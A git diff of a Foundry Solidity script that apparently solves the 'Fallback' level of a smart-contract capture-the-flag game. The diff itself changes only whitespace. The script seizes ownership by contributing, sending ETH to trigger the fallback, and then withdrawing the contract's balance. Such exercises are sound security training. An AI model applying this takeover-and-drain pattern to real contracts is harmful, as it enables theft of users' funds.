@@ -13,7 +13,6 @@ contract Level1FallbackSolution is Script {
     function setUp() public {}
 
     function run() public {
-
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
         level1Fallback.getContribution();
@@ -21,7 +20,7 @@ contract Level1FallbackSolution is Script {
         console.log("The owner was", level1Fallback.owner());
 
         level1Fallback.contribute{value: 0.0001 ether}();
-        
+
         (bool ok,) = address(level1Fallback).call{value: 0.0001 ether}("");
         require(ok, "ETH send failed");
 
@@ -30,6 +29,5 @@ contract Level1FallbackSolution is Script {
         level1Fallback.withdraw();
 
         vm.stopBroadcast();
-      
     }
 }
